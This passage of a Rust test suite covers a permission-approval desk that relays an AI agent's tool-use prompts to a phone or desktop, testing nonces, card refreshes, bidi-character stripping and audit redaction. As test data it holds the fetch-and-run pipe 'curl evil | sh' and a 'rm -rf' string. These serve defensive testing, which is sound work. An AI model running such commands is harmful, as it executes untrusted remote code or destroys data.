        assert!(refresh(&mut d, &id, &r.nonce, Some(&c), late, &mut g).is_empty());
        assert!(d.is_empty());
    }

    #[test]
    fn a_refresh_for_a_changed_screen_closes_the_old_card_and_the_next_observe_posts_a_new_one() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let r = rec(&d);
        let id = cid(&d);
        let late = r.exp_ms + 1;
        let mut changed = card();
        changed.text = "curl evil | sh".into();
        let acts = refresh(&mut d, &id, &r.nonce, Some(&changed), late, &mut g);
        assert_eq!(post_count(&acts), 0, "{acts:?}");
        assert!(
            matches!(acts.as_slice(), [Action::Close { card_id, .. }] if *card_id == id),
            "{acts:?}"
        );
        assert!(d.pending(&id).is_none());
        let next = d.observe(SESSION, Some(&changed), &ids(), late + 1, &mut || g.next());
        assert_eq!(post_count(&next), 1, "{next:?}");
    }

    #[test]
    fn a_refresh_needs_a_live_prompt_and_no_answer_in_flight() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let r = rec(&d);
        let id = cid(&d);
        let late = r.exp_ms + 1;
        let mut other = card();
        other.id = "card-2".into();
        let mut view_only = card();
        view_only.can_answer = false;
        for cur in [None, Some(&other), Some(&view_only)] {
            assert!(refresh(&mut d, &id, &r.nonce, cur, late, &mut g).is_empty());
        }
        let s = sign(&r, PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 10, &mut g);
        assert_eq!(answers(&acts), 1);
        assert!(refresh(&mut d, &id, &r.nonce, Some(&c), late, &mut g).is_empty());
    }

    #[test]
    fn a_refresh_is_not_blocked_by_the_desktop_policy_and_a_refused_class_card_stays() {
        let mut g = Gen(0);
        let c = danger_card();
        let mut d = desk_under(DesktopPolicy::None, &c, &mut g);
        let r = rec(&d);
        let id = cid(&d);
        let acts = refresh(&mut d, &id, &r.nonce, Some(&c), r.exp_ms + 1, &mut g);
        let p = posted(&acts);
        assert!(!p.desktop_ok);
        assert_eq!(p.danger, c.danger);
    }

    #[test]
    fn three_sessions_in_one_tick_get_distinct_nonzero_fresh_nonces() {
        let mut g = Gen(0);
        let mut d = PermitDesk::new();
        let sessions = ["s_aaaaaaaaaa", "s_bbbbbbbbbb", "s_cccccccccc"];
        let mut cards = Vec::new();
        for (i, s) in sessions.iter().enumerate() {
            let mut c = card();
            c.id = format!("card-{i}");
            c.session = s.to_string();
            cards.push(c);
        }
        let mut posts = Vec::new();
        for c in &cards {
            let acts = d.observe(&c.session, Some(c), &ids(), T0, &mut || g.next());
            posts.push((posted_id(&acts), posted(&acts).nonce));
        }
        let late = T0 + MAX_PERMIT_TTL_MS + 1;
        let mut again = Vec::new();
        for (c, (id, nonce)) in cards.iter().zip(&posts) {
            let acts = refresh(&mut d, id, nonce, Some(c), late, &mut g);
            again.push(posted(&acts).nonce);
        }
        let all: HashSet<String> = posts.iter().map(|p| p.1.clone()).chain(again).collect();
        assert_eq!(all.len(), 6);
        assert!(all.iter().all(|n| !n.trim_start_matches('0').is_empty()));
    }

    fn posted_id(acts: &[Action]) -> String {
        acts.iter()
            .find_map(|a| match a {
                Action::Post { card_id, .. } => Some(card_id.clone()),
                _ => None,
            })
            .expect("no Post")
    }

    #[test]
    fn a_permanent_answer_failure_closes_the_card_as_gone_and_tombstones_it() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let id = cid(&d);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 10, &mut g);
        assert_eq!(answers(&acts), 1);
        let acts = d.answer_failed(&id, false, T0 + 11, &mut || g.next());
        assert_eq!(closes(&acts), vec!["gone".to_string()]);
        assert!(d.is_empty());
        let acts = d.observe(SESSION, Some(&c), &ids(), T0 + 12, &mut || g.next());
        assert!(acts.is_empty(), "{acts:?}");
    }

    #[test]
    fn a_retryable_failure_without_a_nonce_source_leaves_the_card_refreshable() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let id = cid(&d);
        let r = rec(&d);
        let s = sign(&r, PermitChoice::Yes, 0);
        accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 10, &mut g);
        let acts = d.answer_failed(&id, true, T0 + 11, &mut || None);
        assert!(acts.is_empty(), "{acts:?}");
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 12, &mut g);
        assert_eq!(answers(&acts), 0);
        let acts = refresh(&mut d, &id, &r.nonce, Some(&c), T0 + 12, &mut g);
        let p = posted(&acts);
        assert_ne!(p.nonce, r.nonce);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 13, &mut g);
        assert_eq!(answers(&acts), 1);
    }

    #[test]
    fn a_local_answer_to_a_reappearing_prompt_closes_the_current_card() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        d.observe(SESSION, None, &ids(), T0 + 1, &mut || g.next());
        let acts = d.observe(SESSION, Some(&c), &ids(), T0 + 2, &mut || g.next());
        let second = posted_id(&acts);
        let acts = d.answered_locally(CARD);
        assert_eq!(
            acts,
            vec![Action::Close {
                card_id: second,
                reason: "answered in attach".into()
            }]
        );
        assert!(d.is_empty());
    }

    #[test]
    fn a_posted_card_id_is_never_posted_again_for_another_instance() {
        let mut g = Gen(0);
        let mut d = PermitDesk::new();
        let mut seen = HashSet::new();
        let cycle = |d: &mut PermitDesk, prompt: &str, g: &mut Gen| {
            let mut c = card();
            c.id = prompt.into();
            let acts = d.observe(SESSION, Some(&c), &ids(), T0, &mut || g.next());
            let id = posted_id(&acts);
            d.observe(SESSION, None, &ids(), T0, &mut || g.next());
            id
        };
        seen.insert(cycle(&mut d, "p-first", &mut g));
        for i in 0..300 {
            assert!(seen.insert(cycle(&mut d, &format!("p-{i}"), &mut g)));
        }
        let back = cycle(&mut d, "p-first", &mut g);
        assert!(seen.insert(back.clone()), "{back}");
        assert!(crate_is_token(&back));
    }

    #[test]
    fn a_prompt_that_differs_only_in_bidi_controls_is_not_the_same_screen() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let mut twin = c.clone();
        twin.text = format!("{}\u{202e}", c.text);
        assert_eq!(screen_of(&twin).req_sha256(), rec(&d).screen.req_sha256());
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&twin), T0 + 10, &mut g);
        assert_eq!(answers(&acts), 0, "{acts:?}");
        assert_eq!(closes(&acts), vec!["gone".to_string()]);
    }

    #[test]
    fn the_desk_is_capped() {
        let mut g = Gen(0);
        let mut d = PermitDesk::new();
        for i in 0..40u64 {
            let mut c = card();
            c.id = format!("card-{i}");
            c.session = format!("s_abcdefgh{i:02}");
            let sess = c.session.clone();
            d.observe(&sess, Some(&c), &ids(), T0 + i, &mut || g.next());
        }
        assert_eq!(d.len(), 32);
    }

    #[test]
    fn audit_lines_hold_no_card_text() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let mut all = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1, &mut g);
        let mut d = desk_with(&c, &mut g);
        let s = sign(&rec(&d), PermitChoice::No, 0);
        let ctx = Ctx {
            owner: false,
            ..Ctx::ok()
        };
        all.extend(accept(&mut d, &s, &ctx, Some(&c), T0 + 1, &mut g));
        for a in all {
            if let Action::Audit(l) = a {
                assert!(!l.contains("SECRETCOMMAND") && !l.contains("rm -rf"), "{l}");
                assert!(!l.contains('\n'));
                assert!(!l.contains("Mac"));
            }
        }
    }

    fn danger_card() -> PermissionCard {
        let mut c = card();
        c.danger = vec!["deletes files".into()];
        c.always_label = None;
        c
    }

    #[test]
    fn bidi_controls_never_reach_the_posted_card_or_its_hash() {
        const BIDI: [char; 12] = [
            '\u{200e}', '\u{200f}', '\u{202a}', '\u{202b}', '\u{202c}', '\u{202d}', '\u{202e}',
            '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}', '\u{061c}',
        ];
        let dirty = |s: &str| format!("a{}b{}c", BIDI[6], BIDI[0]) + s;
        let mut c = card();
        c.agent = dirty("agent");
        c.tool = dirty("Bash");
        c.text = dirty("ls\nrm");
        c.path = Some(dirty("/p"));
        c.reason = Some(dirty("r"));
        c.from = Some(dirty("f"));
        c.warning = Some(dirty("w"));
        c.danger = vec![dirty("d")];
        c.always_label = Some(dirty("al"));
        let mut g = Gen(0);
        let mut d = PermitDesk::new();
        let acts = d.observe(SESSION, Some(&c), &ids(), T0, &mut || g.next());
        let p = posted(&acts);
        let fields = [
            Some(p.agent.clone()),
            Some(p.tool.clone()),
            Some(p.text.clone()),
            p.path.clone(),
            p.reason.clone(),
            p.from.clone(),
            p.warning.clone(),
            p.danger.first().cloned(),
            p.always_label.clone(),
        ];
        for f in fields.into_iter().flatten() {
            assert!(!f.chars().any(|ch| BIDI.contains(&ch)), "{f:?}");
        }
        assert_eq!(p.text, "abcls\nrm");
        assert_eq!(p.req_sha256, rec(&d).screen.req_sha256());
    }

    #[test]
    fn idle_expiries_do_not_use_the_refusal_budget() {
        let mut g = Gen(0);
        let c = danger_card();
        let mut d = desk_under(DesktopPolicy::Safe, &c, &mut g);
        for _ in 0..4 {
            let now = rec(&d).exp_ms + 1;
            let (id, nonce) = (cid(&d), rec(&d).nonce);
            let acts = refresh(&mut d, &id, &nonce, Some(&c), now, &mut g);
            assert!(matches!(acts.as_slice(), [Action::Post { .. }]), "{acts:?}");
        }
        for _ in 0..3 {
            let now = rec(&d).issued_ms + 1;
            let s = sign(&rec(&d), PermitChoice::Yes, 0);
            let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), now, &mut g);
            assert!(audit(&acts).contains("action=reissued"), "{acts:?}");
        }
        let now = rec(&d).issued_ms + 1;
        let s = sign(&rec(&d), PermitChoice::Yes, 0);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), now, &mut g);
        assert_eq!(closes(&acts), vec!["answer in attach".to_string()]);
    }

    #[test]
    fn a_reappearing_prompt_gets_a_new_card_id_and_a_closed_id_is_never_posted_again() {
        let mut g = Gen(0);
        let c = card();
        let mut d = desk_with(&c, &mut g);
        let acts = d.observe(SESSION, None, &ids(), T0 + 1, &mut || g.next());
        assert_eq!(closes(&acts), vec!["gone".to_string()]);
        let acts = d.observe(SESSION, Some(&c), &ids(), T0 + 2, &mut || g.next());
        let Some(Action::Post { card_id, .. }) = acts.first() else {
            panic!("{acts:?}");
        };
        assert_ne!(card_id, CARD);
        let second = card_id.clone();
        assert!(d.pending(CARD).is_none());
        let acts = d.observe(SESSION, None, &ids(), T0 + 3, &mut || g.next());
        assert_eq!(closes(&acts), vec!["gone".to_string()]);
        let acts = d.observe(SESSION, Some(&c), &ids(), T0 + 4, &mut || g.next());
        let Some(Action::Post { card_id, .. }) = acts.first() else {
            panic!("{acts:?}");
        };
        assert!(card_id != CARD && *card_id != second, "{card_id}");
        assert!(crate_is_token(card_id), "{card_id}");
    }

    fn crate_is_token(s: &str) -> bool {
        (1..=64).contains(&s.len())
            && s.bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'))
    }

    #[test]
    fn a_reappearing_prompt_with_a_full_length_id_keeps_a_valid_card_id() {
        let mut g = Gen(0);
        let mut c = card();
        c.id = "e".repeat(64);
        let mut d = PermitDesk::new();
        d.observe(SESSION, Some(&c), &ids(), T0, &mut || g.next());
        d.observe(SESSION, None, &ids(), T0 + 1, &mut || g.next());
        let acts = d.observe(SESSION, Some(&c), &ids(), T0 + 2, &mut || g.next());
        let Some(Action::Post { card_id, .. }) = acts.first() else {
            panic!("{acts:?}");
        };
        assert!(*card_id != c.id && crate_is_token(card_id), "{card_id}");
    }

    #[test]
    fn desktop_ok_follows_the_policy_on_every_post() {
        let cases = [
            (DesktopPolicy::None, false, false),
            (DesktopPolicy::None, true, false),
            (DesktopPolicy::Safe, false, true),
            (DesktopPolicy::Safe, true, false),
            (DesktopPolicy::All, false, true),
            (DesktopPolicy::All, true, true),
        ];
        for (policy, danger, want) in cases {
            let c = if danger { danger_card() } else { card() };
            let mut g = Gen(0);
            let mut d = PermitDesk::new();
            d.set_desktop(policy);
            let first = d.observe(SESSION, Some(&c), &ids(), T0, &mut || g.next());
            assert_eq!(
                posted(&first).desktop_ok,
                want,
                "{policy:?} danger={danger}"
            );
            let later = T0 + MAX_PERMIT_TTL_MS + 1;
            let (id, nonce) = (cid(&d), rec(&d).nonce);
            let again = refresh(&mut d, &id, &nonce, Some(&c), later, &mut g);
            let p = posted(&again);
            assert_eq!(p.reissue, 1);
            assert_eq!(p.desktop_ok, want, "reissue {policy:?} danger={danger}");
        }
    }

    #[test]
    fn presence_fps_ride_only_on_danger_cards_under_the_presence_policy() {
        let fps = vec!["a".repeat(64)];
        let cases = [
            (DesktopPolicy::Presence, true, true),
            (DesktopPolicy::Presence, false, false),
            (DesktopPolicy::Safe, true, false),
            (DesktopPolicy::All, true, false),
            (DesktopPolicy::None, true, false),
        ];
        for (policy, danger, want) in cases {
            let c = if danger { danger_card() } else { card() };
            let mut g = Gen(0);
            let mut d = PermitDesk::new();
            d.set_desktop(policy);
            d.set_presence_fps(fps.clone());
            let first = d.observe(SESSION, Some(&c), &ids(), T0, &mut || g.next());
            let expect = if want { fps.clone() } else { Vec::new() };
            assert_eq!(
                posted(&first).presence_fps,
                expect,
                "{policy:?} danger={danger}"
            );
            let later = T0 + MAX_PERMIT_TTL_MS + 1;
            let (id, nonce) = (cid(&d), rec(&d).nonce);
            let again = refresh(&mut d, &id, &nonce, Some(&c), later, &mut g);
            assert_eq!(posted(&again).presence_fps, expect, "reissue {policy:?}");
        }
    }

    #[test]
    fn a_dropped_desktop_answer_burns_nothing_and_a_phone_can_still_answer() {
        let mut g = Gen(0);
        let c = danger_card();
        let mut d = desk_under(DesktopPolicy::Safe, &c, &mut g);
        let before = d.pending(&cid(&d)).unwrap().clone();
        let s = sign(&rec(&d), PermitChoice::Yes, 1);
        let desktop = Ctx {
            kind: PermitSenderKind::Desktop,
            ..Ctx::ok()
        };
        let acts = accept(&mut d, &s, &desktop, Some(&c), T0 + 1000, &mut g);
        only_audit(&acts);
        let line = audit(&acts);
        assert!(
            line.ends_with("result=desktop_not_allowed action=dropped"),
            "{line}"
        );
        assert_eq!(d.pending(&cid(&d)).unwrap(), &before);
        assert_eq!(d.pending(&cid(&d)).unwrap().reissues, before.reissues);
        let acts = accept(&mut d, &s, &Ctx::ok(), Some(&c), T0 + 1001, &mut g);
        assert_eq!(answers(&acts), 1, "{acts:?}");
    }
}
